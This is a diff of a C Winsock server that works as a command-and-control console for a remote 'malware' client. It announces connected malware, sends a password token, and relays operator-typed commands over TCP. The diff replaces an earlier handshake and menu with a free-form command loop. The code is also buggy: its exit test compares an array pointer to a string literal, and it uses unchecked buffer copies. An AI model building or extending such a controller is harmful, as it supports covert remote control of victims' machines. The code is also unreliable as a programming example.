@@ -1,8 +1,8 @@
 #undef UNICODE
 
-#define WIN32_LEAN_AND_MEAN
+// #define WIN32_LEAN_AND_MEAN
 
-#include <windows.h>
+// #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <stdlib.h>
@@ -84,6 +84,7 @@ int __cdecl main(void)
 
 	while (1)
 	{
+		printf("WAITING...\n");
 		// Accept a client socket
 		ClientSocket = accept(ListenSocket, NULL, NULL);
 		if (ClientSocket == INVALID_SOCKET) {
@@ -94,70 +95,53 @@ int __cdecl main(void)
 		}
 		else
 		{
-			printf("A STRANGE MAN HAS CONNECTED\n");
+			printf("MALWARE HAS BEEN CONNECTED\n");
 		}
 
-		ZeroMemory(recvbuf, recvbuflen);
-		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-		if (iResult > 0)
+
+		char command[DEFAULT_BUFLEN];
+		char buffer[DEFAULT_BUFLEN];
+
+		strcpy(command,"!MD5PASSWORD");
+		iSendResult = send(ClientSocket, command, DEFAULT_BUFLEN, 0);
+		if (iSendResult == SOCKET_ERROR)
 		{
-			char buffer[DEFAULT_BUFLEN];
-			strcpy(buffer, recvbuf);
-			printf("JERRY: %s\n", buffer);
-
-			if (!strcmp(buffer, "!ALOALOCHIMSEGOIDAIBANG"))
-			{
-				char *sendbuf = "!DAIBANGNGHEROALOALO";
-				iSendResult = send(ClientSocket, sendbuf, (int)strlen(sendbuf), 0);
-				if (iSendResult == SOCKET_ERROR)
-				{
-					printf("send failed with error: %d\n", WSAGetLastError());
-					closesocket(ClientSocket);
-					WSACleanup();
-					return 1;
-				}
-				printf("\n\n\n\tCommand table: \n1. PRINT HELLO WORLD\n2. CLOSE THE JERRY UNTIL THE NEXT BOOT\n");
-
-				while (1)
-				{
-					char iChoice[2];
-					// More check here please man
-					printf("TOM: ");
-					scanf("%s", &iChoice);
-					/*if (iChoice - '0' > 9 || iChoice - '0' < 0)
-					{
-						continue;
-					}*/
-					iSendResult = send(ClientSocket, iChoice, (int)strlen(sendbuf), 0);
-					if (iSendResult == SOCKET_ERROR)
-					{
-						printf("send failed with error: %d\n", WSAGetLastError());
-						closesocket(ClientSocket);
-						WSACleanup();
-						return 1;
-					}
-					ZeroMemory(recvbuf, recvbuflen);
-					iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-					if (iResult > 0)
-					{
-						ZeroMemory(buffer, recvbuflen);
-						strcpy(buffer, recvbuf);
-						printf("JERRY: %s\n", buffer);
-					}
-					if (iChoice[0] == '2')
-					{
-						break;
-					}
-				}
-
-			}
-			else
-			{
-				printf("WORNG PASSWORD.\nEXIT\n");
-			}
+			printf("send failed with error: %d\n", WSAGetLastError());
+			closesocket(ClientSocket);
+			WSACleanup();
+			return 1;
 		}
 
+		while (1)
+		{
+			// More check here please man
+			printf("TOM: ");
+			gets_s(command);
+			iSendResult = send(ClientSocket, command, DEFAULT_BUFLEN, 0);
+			if (iSendResult == SOCKET_ERROR)
+			{
+				printf("send failed with error: %d\n", WSAGetLastError());
+				closesocket(ClientSocket);
+				WSACleanup();
+				return 1;
+			}
+
+			//// Recived from malware!
+			//ZeroMemory(recvbuf, recvbuflen);
+			//iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+			//if (iResult > 0)
+			//{
+			//	ZeroMemory(buffer, recvbuflen);
+			//	strcpy(buffer, recvbuf);
+			//	printf("JERRY: %s\n", buffer);
+			//}
+			if (command == "2")
+			{
+				break;
+			}
+		}
 	}
+
 	// cleanup
 	closesocket(ListenSocket);
 	closesocket(ClientSocket);
